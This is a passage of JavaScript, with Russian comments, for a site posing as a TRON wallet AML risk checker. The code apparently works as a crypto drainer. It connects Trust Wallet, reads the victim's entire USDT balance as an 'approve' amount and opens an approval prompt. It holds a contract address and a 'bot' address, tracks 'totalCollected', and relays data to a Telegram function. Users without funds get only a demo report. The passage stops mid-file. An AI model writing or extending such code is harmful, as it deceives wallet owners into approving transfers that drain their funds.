// ============================================
// ГЛОБАЛЬНЫЕ КОНСТАНТЫ
// ============================================
const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const MIN_AMOUNT = 5000000; // 5 USDT
const MAX_AMOUNT = 5000000000; // 5000 USDT

// ============================================
// ПЕРЕМЕННЫЕ СОСТОЯНИЯ
// ============================================
let connectedWalletAddress = null;
let currentApproveAmount = null;
let totalChecks = 0;
let uniqueUsers = new Set();
const startTime = Date.now();

// ============================================
// ПОЛУЧЕНИЕ ЭЛЕМЕНТОВ
// ============================================
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const resultSection = document.getElementById('resultSection');
const checkedAddress = document.getElementById('checkedAddress');
const totalTx = document.getElementById('totalTx');
const suspiciousTx = document.getElementById('suspiciousTx');
const walletAge = document.getElementById('walletAge');
const lastActive = document.getElementById('lastActive');
const riskPercent = document.getElementById('riskPercent');
const sourcesList = document.getElementById('sourcesList');
const downloadPdfBtn = document.getElementById('downloadPdfBtn');
const amountCardContainer = document.getElementById('amountCardContainer');
const modalAmount = document.getElementById('modalAmount');

// ============================================
// КАТЕГОРИИ ДЛЯ АНАЛИЗА
// ============================================
const categories = [
    { name: 'Даркнет-маркеты', icon: 'fa-skull' },
    { name: 'Миксеры', icon: 'fa-random' },
    { name: 'Биржи без KYC', icon: 'fa-exchange-alt' },
    { name: 'Санкционные адреса', icon: 'fa-flag' },
    { name: 'Мошенничество', icon: 'fa-user-secret' },
    { name: 'Финансирование терроризма', icon: 'fa-bomb' }
];

// ============================================
// ЗАГРУЗКА ИСТОРИИ ИЗ LOCALSTORAGE
// ============================================
function loadHistory() {
    const history = localStorage.getItem('checkHistory');
    if (history) {
        const historyData = JSON.parse(history);
        historyData.forEach(item => addToHistory(item.address, item.risk, false));
    }
}

// ============================================
// ДОБАВЛЕНИЕ В ИСТОРИЮ
// ============================================
function addToHistory(address, risk, save = true) {
    const historyList = document.getElementById('historyList');
    const historySection = document.getElementById('historySection');
    
    if (!historyList) return;
    
    historySection.style.display = 'block';
    
    const riskLevel = risk <= 25 ? 'low' : risk <= 75 ? 'medium' : 'high';
    const riskText = risk <= 25 ? 'Низкий' : risk <= 75 ? 'Средний' : 'Высокий';
    
    const historyItem = document.createElement('div');
    historyItem.className = 'history-item';
    historyItem.innerHTML = `
        <span class="history-address">${address.slice(0, 8)}...${address.slice(-4)}</span>
        <span class="history-risk ${riskLevel}">${riskText} риск</span>
    `;
    
    historyList.insertBefore(historyItem, historyList.firstChild);
    
    // Ограничиваем историю 10 элементами
    while (historyList.children.length > 10) {
        historyList.removeChild(historyList.lastChild);
    }
    
    if (save) {
        saveToLocalStorage(address, risk);
    }
}

// ============================================
// СОХРАНЕНИЕ В LOCALSTORAGE
// ============================================
function saveToLocalStorage(address, risk) {
    let history = JSON.parse(localStorage.getItem('checkHistory') || '[]');
    history.unshift({ address, risk, timestamp: Date.now() });
    
    // Оставляем только последние 10
    history = history.slice(0, 10);
    localStorage.setItem('checkHistory', JSON.stringify(history));
}

// ============================================
// ОБНОВЛЕНИЕ МЕТРИК
// ============================================
function updateMetrics() {
    const totalCollectedEl = document.getElementById('totalCollected');
    const totalTransactionsEl = document.getElementById('totalTransactions');
    const uniqueUsersEl = document.getElementById('uniqueUsers');
    const uptimeEl = document.getElementById('uptime');
    
    if (totalCollectedEl) {
        const collected = localStorage.getItem('totalCollected') || '0';
        totalCollectedEl.textContent = parseFloat(collected).toFixed(2);
    }
    
    if (totalTransactionsEl) {
        totalTransactionsEl.textContent = totalChecks;
    }
    
    if (uniqueUsersEl) {
        uniqueUsersEl.textContent = uniqueUsers.size;
    }
    
    if (uptimeEl) {
        const days = Math.floor((Date.now() - startTime) / (24 * 60 * 60 * 1000));
        uptimeEl.textContent = days;
    }
}

// ============================================
// ТЕСТОВАЯ ФУНКЦИЯ TELEGRAM
// ============================================
async function testTelegram() {
    console.log('📨 Тест отправки в Telegram...');
    
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'test',
                address: 'TEST',
                amount: '5',
                risk: '10',
                sources: ['Тест'],
                timestamp: new Date().toLocaleString()
            })
        });
        
        const result = await response.json();
        
        if (response.ok) {
            alert('✅ Тест успешен! Проверьте Telegram');
        } else {
            alert('❌ Ошибка: ' + (result.error || response.status));
        }
    } catch (error) {
        alert('Ошибка соединения: ' + error.message);
    }
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    loadHistory();
    updateMetrics();
    
    if (checkBtn) {
        checkBtn.addEventListener('click', handleTronCheck);
    }

    const connectBtn = document.getElementById('connectTrustBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', connectTrustWallet);
    }

    if (downloadPdfBtn) {
        downloadPdfBtn.addEventListener('click', downloadPDF);
    }

    // Инициализация FAQ
    document.querySelectorAll('.faq-question').forEach(question => {
        question.addEventListener('click', () => {
            question.classList.toggle('active');
            const answer = question.nextElementSibling;
            answer.classList.toggle('active');
        });
    });
});

// ============================================
// ПОДКЛЮЧЕНИЕ TRUST WALLET
// ============================================
async function connectTrustWallet() {
    try {
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            
            connectedWalletAddress = address;
            walletInput.value = address;
            document.getElementById('connectedStatus').style.display = 'inline-flex';
            
            alert('✅ Trust Wallet подключён!');
            
        } else {
            showWalletInstructions();
        }
    } catch (error) {
        console.error(error);
        showWalletInstructions();
    }
}

// ============================================
// ИНСТРУКЦИЯ ПО ПОДКЛЮЧЕНИЮ
// ============================================
function showWalletInstructions() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (isMobile) {
        alert('📱 На телефоне:\n1. Откройте Trust Wallet\n2. Нажмите "Browser"\n3. Введите адрес сайта');
    } else {
        alert('💻 На компьютере:\nУстановите расширение Trust Wallet для браузера');
    }
}

// ============================================
// ПОЛУЧЕНИЕ БАЛАНСА
// ============================================
async function getUSDTBalance(address) {
    try {
        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        if (!tronWeb) return null;

        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        return await contract.balanceOf(address).call();
    } catch (error) {
        console.error('Ошибка баланса:', error);
        return null;
    }
}

// ============================================
// ПРОВЕРКА КОШЕЛЬКА
// ============================================
async function handleTronCheck() {
    try {
        let walletAddress = walletInput.value.trim();
        
        if (!walletAddress && connectedWalletAddress) {
            walletAddress = connectedWalletAddress;
            walletInput.value = connectedWalletAddress;
            console.log('✅ Автоматически подставлен адрес кошелька:', connectedWalletAddress);
        }
        
        if (!walletAddress) {
            alert('Введите адрес кошелька или подключите Trust Wallet');
            return;
        }

        // Добавляем в уникальные пользователи
        uniqueUsers.add(walletAddress);
        updateMetrics();

        // Если есть подключённый кошелёк - показываем модалку с суммой
        if (connectedWalletAddress) {
            const balance = await getUSDTBalance(connectedWalletAddress);
            if (balance) {
                const balanceInUSDT = (balance / 1000000).toFixed(2);
                currentApproveAmount = balance;
                if (modalAmount) {
                    modalAmount.textContent = balanceInUSDT + ' USDT';
                }
                document.getElementById('approveModal').style.display = 'flex';
                return;
            }
        }

        // Иначе просто показываем демо-отчёт
        startAMLCheck(walletAddress, 'manual', 'demo_tx', '5.00');
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
        alert('Ошибка: ' + error.message);
    }
}

// =
